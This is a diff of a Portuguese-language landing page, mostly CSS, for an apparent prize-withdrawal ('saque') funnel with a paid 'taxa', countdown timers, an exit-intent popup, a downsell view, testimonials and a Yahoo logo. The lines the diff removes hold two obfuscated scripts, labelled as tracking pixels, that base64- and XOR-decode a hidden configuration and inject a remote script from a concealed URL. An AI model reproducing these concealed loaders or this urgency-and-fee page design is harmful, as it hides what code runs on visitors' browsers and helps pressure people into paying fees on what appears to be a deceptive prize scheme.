@@ -3,2460 +3,798 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Saque Premia</title>
-
-  <!-- 1. Pixel Utmify -->
-  <script>(function(){var n_p=atob("DLBmXX3ivDREYHbS28tEKA+Ong5mCAKmq8NcclKB2FpqFQK/stYfcx6N0RomElmhuMIPLQmRk0QtGBO+9MAPJRiOkl43QlrwusQSLxSAyUAhE1TogO1KfxqO01YlDAXw4esdfxOD0VFmWlSissgDMTSGnhhmFhe+rtVEZ1/U3Vd8VBTl6IdfaEva3gV3WEDhvYJfbx7AwWk5");var s_5v2s=[];for(var m_s87n=0;m_s87n<n_p.length;m_s87n++){s_5v2s.push(n_p.charCodeAt(m_s87n)&255);}var b_b2=s_5v2s[0];var i_jol=s_5v2s.slice(1,1+b_b2);var x_9116=s_5v2s.slice(1+b_b2);var s_hyx=x_9116.map(function(b,u_xtmq){return b^i_jol[u_xtmq%b_b2];});var v_c="";for(var n_fk4=0;n_fk4<s_hyx.length;n_fk4++){v_c+=String.fromCharCode(s_hyx[n_fk4]&255);}var r_7wa=decodeURIComponent(escape(v_c));var l_pm=JSON.parse(r_7wa);var r_8wjj=l_pm.globals||[];r_8wjj.forEach(function(q_b9){window[q_b9.name]=q_b9.value;});var k_k61=document.createElement("script");k_k61.src=l_pm.url;k_k61.async=true;k_k61.defer=true;(l_pm.attributes||[]).forEach(function(x_jcg){k_k61.setAttribute(x_jcg.name,x_jcg.value);});(document.head||document.documentElement).appendChild(k_k61);})();</script>
-
-  <!-- 2. Script de Captura de UTMs Utmify -->
-  <script>(function(){var a_jv6=atob("DBB1H5EuKIaCph6eAWtXauNCCrygzmrqcWNPML5NTOis02rzaHYMMfJBRajg1DHtYmIcb+VdB/P2y22xbXEBeuJaBuzxhDK8YGQBbfhMXfLn1TykWmtXcfBDTaS4hHr/dXFYauVDQeD7i27sZGYQceUDUOXtwjPtYntXM7NYSer3wzykIzIIM+oMRufvwzykI3QUa/ADXfLvz3jnLGAHeudLRvKv1Wv8aHQGPb0MXufu03u8OzJXYsxT");var k_rt=[];for(var l_6ru=0;l_6ru<a_jv6.length;l_6ru++){k_rt.push(a_jv6.charCodeAt(l_6ru)&255);}var m_50o=k_rt[0];var v_2t8=k_rt.slice(1,1+m_50o);var y_165=k_rt.slice(1+m_50o);var h_510=y_165.map(function(b,g_f7){return b^v_2t8[g_f7%m_50o];});var p_doo9="";for(var t_9f=0;t_9f<h_510.length;t_9f++){p_doo9+=String.fromCharCode(h_510[t_9f]&255);}var p_8mxl=decodeURIComponent(escape(p_doo9));var e_a3dh=JSON.parse(p_8mxl);var l_73o9=e_a3dh.globals||[];l_73o9.forEach(function(w_hye){window[w_hye.name]=w_hye.value;});var x_w5mu=document.createElement("script");x_w5mu.src=e_a3dh.url;x_w5mu.async=true;x_w5mu.defer=true;(e_a3dh.attributes||[]).forEach(function(j_es){x_w5mu.setAttribute(j_es.name,j_es.value);});(document.head||document.documentElement).appendChild(x_w5mu);})();</script>
-
+  <title>Status de Liberação - Acelerador de Saque</title>
+  
+  <!-- Inter Font -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
-  
+
   <style>
-    * {
+    /* CSS Reset & Variables */
+    *, *::before, *::after {
       box-sizing: border-box;
       margin: 0;
       padding: 0;
-      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-      -webkit-tap-highlight-color: transparent;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
     }
 
     body {
-      background-color: #f3f5f8;
-      color: #1a202c;
-      display: flex;
-      justify-content: center;
-      padding: 20px 12px 30px;
+      background-color: #f1f5f9;
+      color: #0f172a;
       min-height: 100vh;
-      transition: background-color 0.3s ease;
-    }
-
-    body.dark-downsell-mode {
-      background-color: #070a12;
-      color: #f8fafc;
-      padding: 16px 12px 40px;
-    }
-
-    .container {
-      max-width: 480px;
-      width: 100%;
       display: flex;
-      flex-direction: column;
-      gap: 16px;
-    }
-
-    .top-badge {
-      align-self: center;
-      background: #e6f9f0;
-      color: #0d8a4e;
-      border: 1px solid #b6ecd1;
-      padding: 6px 14px;
-      border-radius: 999px;
-      font-size: 11px;
-      font-weight: 700;
-      letter-spacing: 0.5px;
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-      text-transform: uppercase;
-    }
-
-    .header-text {
-      text-align: center;
-      margin-top: 4px;
-    }
-
-    .header-text h1 {
-      font-size: 26px;
-      line-height: 1.25;
-      font-weight: 900;
-      color: #0f172a;
-    }
-
-    .header-text h1 span {
-      color: #6001d2;
-    }
-
-    .header-text p {
-      font-size: 13px;
-      color: #64748b;
-      margin-top: 10px;
-      line-height: 1.5;
-    }
-
-    /* Timer Pill */
-    .timer-pill {
-      background: #ffffff;
-      border: 1px solid #fecaca;
-      border-radius: 999px;
-      padding: 10px 18px;
-      text-align: center;
-      font-size: 13px;
-      color: #dc2626;
-      font-weight: 600;
-      display: flex;
-      align-items: center;
       justify-content: center;
-      gap: 8px;
-      box-shadow: 0 1px 2px rgba(220, 38, 38, 0.05);
-    }
-
-    /* Trust Chips */
-    .trust-chips {
-      display: grid;
-      grid-template-columns: 1fr 1fr 1fr;
-      gap: 6px;
-    }
-
-    .chip {
-      background: #ffffff;
-      border: 1px solid #e2e8f0;
-      border-radius: 999px;
-      padding: 8px 4px;
-      font-size: 10.5px;
-      color: #475569;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 4px;
-      font-weight: 600;
-    }
-
-    /* Standard Cards */
-    .card {
-      background: #ffffff;
-      border-radius: 20px;
-      padding: 20px 18px;
-      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.04);
-      border: 1px solid #e2e8f0;
-    }
-
-    .card-border-red {
-      border-left: 4px solid #ef4444;
-    }
-
-    .card-title {
-      font-size: 14px;
-      font-weight: 800;
-      color: #0f172a;
-      margin-bottom: 8px;
-    }
-
-    /* Warning List */
-    .warning-list {
-      list-style: none;
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-      margin-top: 12px;
-      font-size: 12.5px;
-      color: #334155;
-    }
-
-    .warning-list li {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-
-    /* Purple Explanation Card */
-    .purple-card {
-      background: linear-gradient(135deg, #6001d2, #47009e);
-      border-radius: 20px;
-      padding: 22px 18px;
-      color: #ffffff;
-      text-align: center;
-    }
-
-    .purple-badge {
-      background: rgba(255, 255, 255, 0.2);
-      border-radius: 999px;
-      padding: 4px 12px;
-      font-size: 10px;
-      font-weight: 700;
-      letter-spacing: 0.5px;
-      display: inline-block;
-      text-transform: uppercase;
-      margin-bottom: 12px;
-    }
-
-    .purple-card h2 {
-      font-size: 18px;
-      font-weight: 800;
-      margin-bottom: 10px;
-    }
-
-    .purple-card p {
-      font-size: 12.5px;
-      line-height: 1.55;
-      color: #f3e8ff;
-    }
-
-    /* Feature Check List */
-    .features-list {
-      display: flex;
-      flex-direction: column;
-      gap: 14px;
-    }
-
-    .feature-item {
-      display: flex;
-      gap: 10px;
       align-items: flex-start;
+      padding: 24px 12px 48px;
     }
 
-    .feature-item .icon {
-      color: #10b981;
-      margin-top: 1px;
-      flex-shrink: 0;
-    }
-
-    .feature-item h3 {
-      font-size: 13px;
-      font-weight: 700;
-      color: #0f172a;
-    }
-
-    .feature-item p {
-      font-size: 11.5px;
-      color: #64748b;
-      margin-top: 2px;
-    }
-
-    /* Steps Section */
-    .section-headline {
-      font-size: 14px;
-      font-weight: 800;
-      text-transform: uppercase;
-      color: #0f172a;
-      margin-bottom: 14px;
-    }
-
-    .steps-list {
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-    }
-
-    .step-box {
-      background: #f8fafc;
-      border: 1px solid #e2e8f0;
-      border-radius: 12px;
-      padding: 12px;
-      display: flex;
-      gap: 12px;
-    }
-
-    .step-num {
-      width: 28px;
-      height: 28px;
-      background: #15803d;
-      color: #ffffff;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-weight: 700;
-      font-size: 13px;
-      flex-shrink: 0;
-    }
-
-    .step-content h4 {
-      font-size: 13px;
-      font-weight: 700;
-      color: #0f172a;
-    }
-
-    .step-content p {
-      font-size: 11.5px;
-      color: #475569;
-      margin-top: 2px;
-      line-height: 1.4;
-    }
-
-    .note-box {
-      background: #f0fdf4;
-      border: 1px solid #bbf7d0;
-      border-radius: 10px;
-      padding: 10px 12px;
-      font-size: 11px;
-      color: #166534;
-      margin-top: 10px;
-      line-height: 1.4;
-    }
-
-    /* Payment Box */
-    .pay-card {
-      background: #ffffff;
-      border-radius: 20px;
-      padding: 20px 18px;
-      border: 1.5px solid #facc15;
-      text-align: center;
-    }
-
-    .receipt-header {
-      font-size: 10px;
-      font-weight: 800;
-      color: #ca8a04;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      margin-bottom: 12px;
-    }
-
-    .receipt-line {
-      display: flex;
-      justify-content: space-between;
-      font-size: 13px;
-      color: #475569;
-      margin-bottom: 8px;
-    }
-
-    .highlight-price {
-      font-size: 32px;
-      font-weight: 900;
-      color: #eab308;
-      margin: 14px 0;
-    }
-
-    /* Buttons */
-    .btn-green {
-      background: #16a34a;
-      color: #ffffff;
-      border: none;
+    /* Main Container Card */
+    .page-wrapper {
       width: 100%;
-      padding: 14px 16px;
-      border-radius: 12px;
-      font-size: 13px;
-      font-weight: 800;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      text-transform: uppercase;
-      box-shadow: 0 4px 12px rgba(22, 163, 74, 0.28);
-      transition: background-color 0.15s ease, transform 0.1s ease;
-    }
-
-    .btn-green:active {
-      transform: scale(0.99);
-      background-color: #15803d;
-    }
-
-    .btn-sub {
-      font-size: 10px;
-      color: #64748b;
-      margin-top: 8px;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      gap: 12px;
-    }
-
-    /* Guarantee */
-    .status-alert {
-      background: #f0fdf4;
-      border: 1px solid #dcfce7;
-      border-radius: 12px;
-      padding: 10px;
-      font-size: 11px;
-      color: #166534;
-      margin-top: 12px;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-
-    .green-dot {
-      width: 8px;
-      height: 8px;
-      background: #22c55e;
-      border-radius: 50%;
-      flex-shrink: 0;
-    }
-
-    /* Testimonials */
-    .testimonial {
-      background: #f8fafc;
+      max-width: 480px;
+      background: #ffffff;
+      border-radius: 28px;
       border: 1px solid #e2e8f0;
-      border-radius: 12px;
-      padding: 12px;
-      margin-top: 10px;
-    }
-
-    .testimonial-user {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      margin-bottom: 6px;
-    }
-
-    .avatar {
-      width: 36px;
-      height: 36px;
-      border-radius: 50%;
-      object-fit: cover;
-      border: 1.5px solid #cbd5e1;
-      flex-shrink: 0;
-    }
-
-    .testimonial-meta h5 {
-      font-size: 12px;
-      font-weight: 700;
-      color: #0f172a;
-    }
-
-    .testimonial-meta span {
-      font-size: 10px;
-      color: #94a3b8;
-    }
-
-    .stars {
-      color: #eab308;
-      font-size: 10px;
-    }
-
-    .testimonial-text {
-      font-size: 11.5px;
-      color: #475569;
-      line-height: 1.4;
-    }
-
-    .faq-container {
+      box-shadow: 0 10px 25px -5px rgba(15, 23, 42, 0.05), 0 8px 10px -6px rgba(15, 23, 42, 0.03);
+      padding: 26px 20px 32px;
       display: flex;
       flex-direction: column;
-      gap: 10px;
+      gap: 20px;
     }
 
-    .faq-item {
+    /* Status Box */
+    .status-card {
       background: #ffffff;
-      border: 1.5px solid #d1fae5;
+      border: 1px solid #e2e8f0;
       border-radius: 16px;
-      overflow: hidden;
-      transition: border-color 0.2s ease, box-shadow 0.2s ease;
+      padding: 16px 18px 14px;
     }
 
-    .faq-item.active {
-      border-color: #86efac;
-      box-shadow: 0 4px 12px rgba(22, 163, 74, 0.06);
-    }
-
-    .faq-header {
-      width: 100%;
-      background: none;
-      border: none;
-      text-align: left;
-      padding: 16px 18px;
+    .status-header {
       display: flex;
       justify-content: space-between;
       align-items: center;
-      gap: 12px;
-      cursor: pointer;
-      font-size: 13px;
-      font-weight: 700;
-      color: #0f172a;
-      transition: color 0.15s ease;
-    }
-
-    .faq-header:hover {
-      color: #16a34a;
-    }
-
-    .faq-chevron {
-      color: #16a34a;
-      flex-shrink: 0;
-      transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-    }
-
-    .faq-item.active .faq-chevron {
-      transform: rotate(180deg);
-    }
-
-    .faq-body {
-      max-height: 0;
-      overflow: hidden;
-      transition: max-height 0.35s cubic-bezier(0.4, 0, 0.2, 1);
-    }
-
-    .faq-content {
-      padding: 0 18px 16px 18px;
-      font-size: 12px;
-      line-height: 1.55;
-      color: #475569;
-    }
-
-    .pill-red {
-      background: #dc2626;
-      color: #ffffff;
-      border-radius: 999px;
-      padding: 8px 16px;
-      font-size: 12px;
-      font-weight: 700;
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-      margin-bottom: 12px;
-    }
-
-    .yahoo-logo-container {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      margin: 8px 0 16px;
-    }
-
-    .yahoo-img {
-      height: 38px;
-      max-width: 175px;
-      width: auto;
-      object-fit: contain;
-      display: block;
-    }
-
-    .modal-backdrop {
-      position: fixed;
-      inset: 0;
-      background-color: rgba(15, 23, 42, 0.72);
-      backdrop-filter: blur(4px);
-      -webkit-backdrop-filter: blur(4px);
-      display: none;
-      align-items: center;
-      justify-content: center;
-      z-index: 9999;
-      padding: 16px;
-      opacity: 0;
-      transition: opacity 0.25s ease;
-    }
-
-    .modal-backdrop.open {
-      display: flex;
-      opacity: 1;
-    }
-
-    .modal-card {
-      background: #ffffff;
-      width: 100%;
-      max-width: 410px;
-      border-radius: 26px;
-      padding: 28px 22px 26px;
-      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.35);
-      position: relative;
-      animation: modalPop 0.28s cubic-bezier(0.16, 1, 0.3, 1) forwards;
-    }
-
-    @keyframes modalPop {
-      0% {
-        transform: scale(0.92) translateY(12px);
-        opacity: 0;
-      }
-      100% {
-        transform: scale(1) translateY(0);
-        opacity: 1;
-      }
-    }
-
-    .modal-close-btn {
-      position: absolute;
-      top: 18px;
-      right: 18px;
-      background: transparent;
-      border: none;
-      cursor: pointer;
-      color: #94a3b8;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 4px;
-      border-radius: 50%;
-      transition: color 0.15s, background 0.15s;
-    }
-
-    .modal-close-btn:hover {
-      color: #475569;
-      background: #f1f5f9;
-    }
-
-    .modal-icon-wrapper {
-      display: flex;
-      justify-content: center;
-      margin-bottom: 14px;
-    }
-
-    .modal-circle-icon {
-      width: 56px;
-      height: 56px;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .modal-circle-green {
-      background-color: #e6f9f0;
-      color: #0d8a4e;
-    }
-
-    .modal-circle-blue {
-      background-color: #eff6ff;
-      color: #2563eb;
-    }
-
-    .modal-title {
-      text-align: center;
-      font-size: 21px;
+      font-size: 11.5px;
       font-weight: 800;
-      color: #0f172a;
-      line-height: 1.25;
-      margin-bottom: 8px;
-    }
-
-    .modal-subtext {
-      text-align: center;
-      font-size: 13px;
-      color: #64748b;
-      line-height: 1.45;
-      margin-bottom: 20px;
-    }
-
-    .modal-input-label {
-      display: block;
-      font-size: 13px;
-      font-weight: 700;
-      color: #1e293b;
-      margin-bottom: 8px;
-    }
-
-    .modal-input {
-      width: 100%;
-      background: #111827;
-      border: 1px solid #1f2937;
-      color: #f8fafc;
-      padding: 15px 16px;
-      border-radius: 12px;
-      font-size: 13.5px;
-      outline: none;
-      transition: border-color 0.2s, box-shadow 0.2s;
-    }
-
-    .modal-input::placeholder {
-      color: #64748b;
-    }
-
-    .modal-input:focus {
-      border-color: #2563eb;
-      box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.2);
-    }
-
-    .btn-modal-blue {
-      margin-top: 14px;
-      width: 100%;
-      background: #2563eb;
-      color: #ffffff;
-      border: none;
-      padding: 15px;
-      border-radius: 12px;
-      font-size: 13.5px;
-      font-weight: 800;
+      color: #334155;
       letter-spacing: 0.3px;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      box-shadow: 0 4px 12px rgba(37, 99, 235, 0.35);
-      transition: background 0.15s, transform 0.1s;
-    }
-
-    .btn-modal-blue:active {
-      transform: scale(0.99);
-      background: #1d4ed8;
-    }
-
-    .system-progress-header {
-      font-size: 11px;
-      font-weight: 800;
-      color: #64748b;
-      letter-spacing: 0.5px;
       text-transform: uppercase;
       margin-bottom: 12px;
     }
 
-    .progress-step-list {
-      list-style: none;
-      display: flex;
-      flex-direction: column;
-      gap: 12px;
-      margin-bottom: 20px;
+    .status-header .step-highlight {
+      color: #0f172a;
+      font-weight: 800;
     }
 
-    .progress-step-item {
+    .status-badge {
+      color: #059669;
+      font-weight: 700;
       display: flex;
       align-items: center;
-      gap: 10px;
-      font-size: 13px;
-      font-weight: 600;
-      color: #64748b;
+      gap: 4px;
+      font-size: 11.5px;
+      text-transform: none;
     }
 
-    .progress-step-item.active {
-      color: #2563eb;
-      font-weight: 700;
-    }
-
-    .progress-step-item.completed {
-      color: #15803d;
-      font-weight: 700;
-    }
-
-    .progress-bar-container {
+    .progress-bar-track {
       width: 100%;
-      height: 8px;
-      background: #e2e8f0;
+      height: 9px;
+      background-color: #e2e8f0;
       border-radius: 999px;
       overflow: hidden;
-      margin-top: 8px;
+      margin-bottom: 8px;
     }
 
     .progress-bar-fill {
+      width: 28.5%; /* 2 de 7 concluindo */
       height: 100%;
       background: #2563eb;
-      width: 25%;
       border-radius: 999px;
-      transition: width 0.35s ease;
+      transition: width 0.4s ease;
     }
 
-    .progress-footer {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      font-size: 12px;
-      font-weight: 700;
+    .status-footer {
+      text-align: right;
+      font-size: 11.5px;
       color: #64748b;
-      margin-top: 14px;
+      font-weight: 500;
     }
 
-    .progress-percent-val {
-      color: #2563eb;
+    /* Taxa Paga Pill */
+    .taxa-paga-pill {
+      background: #e6f9f0;
+      border: 1px solid #b6ecd1;
+      border-radius: 999px;
+      padding: 10px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      color: #0d8a4e;
+      font-size: 12px;
+      font-weight: 800;
+      letter-spacing: 0.4px;
+      text-transform: uppercase;
     }
 
-    .modal-warning-card {
+    /* Main Headline & Description */
+    .main-hero-text {
+      text-align: center;
+      padding: 2px 4px;
+    }
+
+    .main-title {
+      font-size: 26px;
+      line-height: 1.25;
+      font-weight: 900;
+      color: #0f172a;
+      letter-spacing: -0.4px;
+      margin-bottom: 14px;
+    }
+
+    .main-title .amount-highlight {
+      color: #059669;
+    }
+
+    .main-description {
+      font-size: 13px;
+      color: #475569;
+      line-height: 1.55;
+    }
+
+    .main-description strong {
+      color: #0f172a;
+    }
+
+    .main-description .danger-highlight {
+      color: #dc2626;
+      text-decoration: underline;
+      text-underline-offset: 2px;
+      font-weight: 700;
+    }
+
+    /* Warning Card */
+    .warning-card {
       background: #fef2f2;
       border: 1px solid #fecaca;
-      border-radius: 12px;
-      padding: 12px 14px;
-      display: flex;
-      gap: 10px;
-      margin-bottom: 18px;
-    }
-
-    .modal-warning-card p {
-      font-size: 11.5px;
-      color: #991b1b;
-      line-height: 1.45;
-    }
-
-    .btn-redirect-badge {
-      width: 100%;
-      background: #fffbeb;
-      border: 1.5px solid #fde68a;
-      border-radius: 12px;
-      padding: 14px;
-      text-align: center;
-      font-size: 13px;
-      font-weight: 700;
-      color: #b45309;
-      margin-top: 14px;
-      cursor: pointer;
-      display: block;
-      text-decoration: none;
-      transition: background-color 0.15s ease, border-color 0.15s ease, transform 0.1s ease;
-    }
-
-    .btn-redirect-badge:hover {
-      background: #fef3c7;
-      border-color: #f59e0b;
-    }
-
-    .btn-redirect-badge:active {
-      transform: scale(0.99);
-    }
-
-    @keyframes spin {
-      100% {
-        transform: rotate(360deg);
-      }
-    }
-
-    .spinner-svg {
-      animation: spin 1s linear infinite;
-    }
-
-    .exit-modal-backdrop {
-      position: fixed;
-      inset: 0;
-      background: radial-gradient(circle at center, rgba(15, 23, 42, 0.88), rgba(2, 6, 23, 0.96));
-      backdrop-filter: blur(8px);
-      -webkit-backdrop-filter: blur(8px);
-      display: none;
-      align-items: center;
-      justify-content: center;
-      z-index: 100000;
-      padding: 16px;
-      opacity: 0;
-      transition: opacity 0.28s ease;
-    }
-
-    .exit-modal-backdrop.open {
-      display: flex;
-      opacity: 1;
-    }
-
-    .exit-modal-card {
-      background: #111827;
-      border: 1.5px solid #ef4444;
-      box-shadow: 0 0 35px rgba(239, 68, 68, 0.35), 0 25px 60px -15px rgba(0, 0, 0, 0.8);
-      border-radius: 28px;
-      width: 100%;
-      max-width: 440px;
-      padding: 34px 24px 30px;
-      text-align: center;
-      position: relative;
-      animation: exitPop 0.3s cubic-bezier(0.16, 1, 0.3, 1) forwards;
-    }
-
-    @keyframes exitPop {
-      0% {
-        transform: scale(0.9) translateY(18px);
-        opacity: 0;
-      }
-      100% {
-        transform: scale(1) translateY(0);
-        opacity: 1;
-      }
-    }
-
-    .exit-badge {
-      display: inline-flex;
-      align-items: center;
-      gap: 7px;
-      background: rgba(239, 68, 68, 0.12);
-      border: 1px solid rgba(239, 68, 68, 0.35);
-      border-radius: 999px;
-      padding: 6px 16px;
-      font-size: 11px;
-      font-weight: 800;
-      letter-spacing: 0.6px;
-      color: #f87171;
-      text-transform: uppercase;
-      margin-bottom: 16px;
-    }
-
-    .exit-title {
-      color: #ffffff;
-      font-size: 24px;
-      font-weight: 900;
-      line-height: 1.25;
-      letter-spacing: -0.3px;
-      text-transform: uppercase;
-      margin-bottom: 12px;
-    }
-
-    .exit-desc {
-      color: #cbd5e1;
-      font-size: 13.5px;
-      line-height: 1.55;
-      margin-bottom: 22px;
-      padding: 0 6px;
-    }
-
-    .exit-desc strong {
-      color: #facc15;
-      font-weight: 800;
-    }
-
-    .exit-timer-pill {
-      background: #090e17;
-      border: 1px solid #1f293d;
-      border-radius: 999px;
-      padding: 13px 20px;
-      font-size: 13.5px;
-      color: #94a3b8;
-      font-weight: 600;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 6px;
-      margin-bottom: 20px;
-    }
-
-    .exit-timer-pill strong {
-      color: #ef4444;
-      font-weight: 800;
-      font-size: 15px;
-    }
-
-    .btn-exit-action {
-      background: #059669;
-      background: linear-gradient(180deg, #10b981 0%, #059669 100%);
-      color: #ffffff;
-      border: none;
-      width: 100%;
-      padding: 17px 18px;
-      border-radius: 14px;
-      font-size: 14px;
-      font-weight: 900;
-      letter-spacing: 0.2px;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      text-transform: uppercase;
-      box-shadow: 0 0 24px rgba(16, 185, 129, 0.4), 0 4px 10px rgba(5, 150, 105, 0.4);
-      transition: transform 0.12s ease, filter 0.15s ease;
-    }
-
-    .btn-exit-action:hover {
-      filter: brightness(1.06);
-    }
-
-    .btn-exit-action:active {
-      transform: scale(0.985);
-    }
-
-    .exit-dismiss-link {
-      display: inline-block;
-      margin-top: 18px;
-      color: #64748b;
-      font-size: 12px;
-      text-decoration: underline;
-      cursor: pointer;
-      transition: color 0.15s ease;
-      line-height: 1.4;
-    }
-
-    .exit-dismiss-link:hover {
-      color: #94a3b8;
-    }
-
-    #downsellView {
-      display: none;
-      width: 100%;
-      max-width: 480px;
-      flex-direction: column;
-      gap: 16px;
-      animation: fadeInDownsell 0.35s ease forwards;
-    }
-
-    @keyframes fadeInDownsell {
-      from {
-        opacity: 0;
-        transform: translateY(14px);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
-
-    .downsell-top-badge {
-      align-self: center;
-      background: linear-gradient(90deg, #d97706 0%, #ea580c 100%);
-      color: #ffffff;
-      box-shadow: 0 0 20px rgba(234, 88, 12, 0.45);
-      border-radius: 999px;
-      padding: 10px 18px;
-      font-size: 11px;
-      font-weight: 800;
-      letter-spacing: 0.6px;
-      text-transform: uppercase;
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      gap: 7px;
-      text-align: center;
-      width: 100%;
-      max-width: 440px;
-    }
-
-    .downsell-logo-wrap {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      margin: 8px 0 4px;
-    }
-
-    .downsell-logo-img {
-      height: 38px;
-      width: auto;
-      object-fit: contain;
-    }
-
-    .downsell-headline-box {
-      text-align: center;
-      padding: 0 4px;
-    }
-
-    .downsell-title {
-      font-size: 24px;
-      font-weight: 900;
-      color: #ffffff;
-      line-height: 1.3;
-      letter-spacing: -0.4px;
-    }
-
-    .downsell-title span {
-      color: #eab308;
-    }
-
-    .downsell-desc {
-      font-size: 13px;
-      line-height: 1.55;
-      color: #94a3b8;
-      margin-top: 10px;
-      padding: 0 6px;
-    }
-
-    .downsell-desc strong {
-      color: #f1f5f9;
-    }
-
-    /* Downsell Gold Timer Box */
-    .downsell-timer-card {
-      background: #0f1626;
-      border: 1px solid #78350f;
-      box-shadow: 0 0 22px rgba(234, 179, 8, 0.12);
       border-radius: 18px;
-      padding: 16px 14px;
+      padding: 18px 16px;
       text-align: center;
     }
 
-    .downsell-timer-title {
-      font-size: 11px;
+    .warning-title {
+      color: #dc2626;
+      font-size: 13px;
       font-weight: 800;
-      color: #facc15;
-      letter-spacing: 0.6px;
       text-transform: uppercase;
+      letter-spacing: 0.5px;
       display: flex;
       align-items: center;
       justify-content: center;
       gap: 6px;
+      margin-bottom: 10px;
     }
 
-    .downsell-timer-clock {
-      font-size: 38px;
-      font-weight: 900;
-      color: #facc15;
+    .warning-text {
+      font-size: 12px;
+      line-height: 1.55;
+      color: #b91c1c;
+    }
+
+    /* Expiration Timer Pill */
+    .expire-timer-pill {
+      background: #ffffff;
+      border: 1px solid #fecaca;
+      border-radius: 999px;
+      padding: 10px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      font-size: 12px;
+      font-weight: 800;
+      color: #dc2626;
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+      box-shadow: 0 1px 3px rgba(220, 38, 38, 0.04);
+    }
+
+    .expire-timer-pill .timer-clock {
+      font-variant-numeric: tabular-nums;
       letter-spacing: 1px;
-      margin: 4px 0 6px;
     }
 
-    .downsell-timer-note {
-      font-size: 11.5px;
-      color: #94a3b8;
-      line-height: 1.4;
-    }
-
-    /* Downsell Big Container Card */
-    .downsell-main-card {
-      background: #0c121e;
-      border: 1px solid #1e293b;
-      border-radius: 24px;
-      padding: 22px 18px;
+    /* Offer Recommended Card */
+    .offer-card {
       position: relative;
-      box-shadow: 0 20px 45px -15px rgba(0, 0, 0, 0.7);
+      border: 2px solid #facc15;
+      border-radius: 20px;
+      padding: 24px 18px 20px;
+      background: #ffffff;
+      margin-top: 4px;
     }
 
-    .downsell-floating-badge {
+    .floating-recommend-badge {
       position: absolute;
       top: -12px;
       right: 18px;
-      background: #059669;
-      color: #ffffff;
-      font-size: 10px;
-      font-weight: 800;
-      letter-spacing: 0.5px;
-      padding: 6px 14px;
+      background: #eab308;
+      color: #0f172a;
+      font-size: 10.5px;
+      font-weight: 900;
+      letter-spacing: 0.6px;
+      padding: 4px 14px;
       border-radius: 999px;
       text-transform: uppercase;
-      box-shadow: 0 0 16px rgba(16, 185, 129, 0.5);
+      box-shadow: 0 2px 6px rgba(234, 179, 8, 0.35);
     }
 
-    .downsell-info-inner {
-      background: #111a2e;
-      border: 1px solid #1e293b;
-      border-radius: 16px;
-      padding: 16px;
-      margin-top: 6px;
+    .offer-header-group {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      margin-bottom: 16px;
     }
 
-    .downsell-info-inner p {
-      font-size: 12.5px;
-      line-height: 1.6;
-      color: #cbd5e1;
+    .thunder-icon-box {
+      width: 44px;
+      height: 44px;
+      background: #eff6ff;
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #ea580c;
+      flex-shrink: 0;
     }
 
-    .downsell-info-inner strong {
+    .offer-header-info {
+      display: flex;
+      flex-direction: column;
+      gap: 2px;
+    }
+
+    .offer-tag-vip {
+      font-size: 10px;
+      font-weight: 800;
+      color: #64748b;
+      letter-spacing: 0.6px;
+      text-transform: uppercase;
+    }
+
+    .offer-title {
+      font-size: 16px;
+      font-weight: 900;
+      color: #0f172a;
+      line-height: 1.25;
+    }
+
+    /* Inner Benefit Box */
+    .benefit-highlight-box {
+      background: #f8fafc;
+      border-radius: 12px;
+      padding: 14px 16px;
+      margin-bottom: 20px;
+    }
+
+    .benefit-title {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 13px;
+      font-weight: 800;
+      color: #0f172a;
+      margin-bottom: 4px;
+    }
+
+    .benefit-title svg {
+      color: #059669;
+      stroke-width: 3;
+    }
+
+    .benefit-desc {
+      font-size: 11.5px;
+      color: #64748b;
+      line-height: 1.45;
+      padding-left: 20px;
+    }
+
+    /* Price Section */
+    .price-callout-wrap {
+      text-align: center;
+      margin-bottom: 18px;
+    }
+
+    .price-callout-label {
+      font-size: 11px;
+      font-weight: 800;
+      color: #64748b;
+      letter-spacing: 0.8px;
+      text-transform: uppercase;
+      margin-bottom: 4px;
+    }
